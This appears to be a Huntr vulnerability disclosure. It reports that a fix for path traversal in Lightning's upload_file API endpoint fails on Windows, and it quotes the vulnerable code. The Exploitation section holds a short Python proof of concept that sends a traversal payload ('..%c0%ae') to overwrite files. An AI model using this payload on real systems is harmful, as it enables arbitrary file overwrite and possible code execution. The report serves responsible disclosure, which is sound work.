# Invalid fix on previous published Unrestricted File Upload Path On Windows

## Description

Previous Published Huntr report [5f57952d-b7a6-4a0e-b98f-7ace062a6b6b](https://huntr.com/bounties/5f57952d-b7a6-4a0e-b98f-7ace062a6b6b) reported a case where utilized `src/lightning/app/core/api.py`'s `@fastapi_service.put("/api/v1/upload_file/{filename}")`'s `tmp_file = os.path.join(tmp, filename)` as `Path traversal` a vector to achieve Arbitrary File Overwrite in arbitrary directory, resulting RCE, etc. Only window Operation System will be effected since if the `UNIX` path indicator `/` exist in the request URL, then `api.py` will fail to retrieve `filename` properly, which Windows `\` (`%5C`) can take advantage of.

This report is published 12 days ago (*2024-5-4*), however, this exploitation still functions properly.

## Source-to-Sink

`src/lightning/app/core/api.py`

```python
@fastapi_service.put("/api/v1/upload_file/{filename}")
async def upload_file(response: Response, filename: str, uploaded_file: UploadFile = File(...)) -> Union[str, dict]:
    if not ENABLE_UPLOAD_ENDPOINT:
        response.status_code = status.HTTP_405_METHOD_NOT_ALLOWED
        return {"status": "failure", "reason": "This endpoint is disabled."}

    with TemporaryDirectory() as tmp:
        drive = Drive(
            "lit://uploaded_files",
            component_name="file_server",
            allow_duplicates=True,
            root_folder=tmp,
        )
        tmp_file = os.path.join(tmp, filename)

        with open(tmp_file, "wb") as f:
            done = False
            while not done:
                # Note: The 8192 number doesn't have a strong reason.
                content = await uploaded_file.read(8192)
                f.write(content)
                done = content == b""

        with _context(str(ComponentContext.WORK)):
            drive.put(filename)
    return f"Successfully uploaded '{filename}' to the Drive"


@fastapi_service.get("/api/v1/status", response_model=AppStatus)
async def get_status() -> AppStatus:
    """Get the current status of the app and works."""
    global app_status
    if app_status is None:
        raise HTTPException(
            status_code=status.HTTP_503_SERVICE_UNAVAILABLE, detail="App status hasn't been reported yet."
        )
    return app_status
```

which referenced:

```python
from lightning.app.core.constants import (
    ENABLE_PULLING_STATE_ENDPOINT,
    ENABLE_PUSHING_STATE_ENDPOINT,
    ENABLE_STATE_WEBSOCKET,
    ENABLE_UPLOAD_ENDPOINT,
    FRONTEND_DIR,
    get_cloud_queue_type,
)
```

`ENABLE_UPLOAD_ENDPOINT` is default as true at `src/lightning/app/core/constants.py`

```python
ENABLE_STATE_WEBSOCKET = bool(int(os.getenv("ENABLE_STATE_WEBSOCKET", "1")))
ENABLE_UPLOAD_ENDPOINT = bool(int(os.getenv("ENABLE_UPLOAD_ENDPOINT", "1")))
```

## Exploitation

**PoC Video ->** https://drive.google.com/file/d/1dUQ9Co8cdnZo7OIVBr4NgADLV14kN3XM/view?usp=sharing

```python
# exploit.py

import requests
import urllib.parse

URL = "http://127.0.0.1:7501"
session = requests.Session()
session.trust_env = False

req = session.put(
    url=URL+'/api/v1/upload_file//..%c0%ae/..%c0%ae/',
    files={'uploaded_file':b'retr0reg'},
)

print(req.content)
```
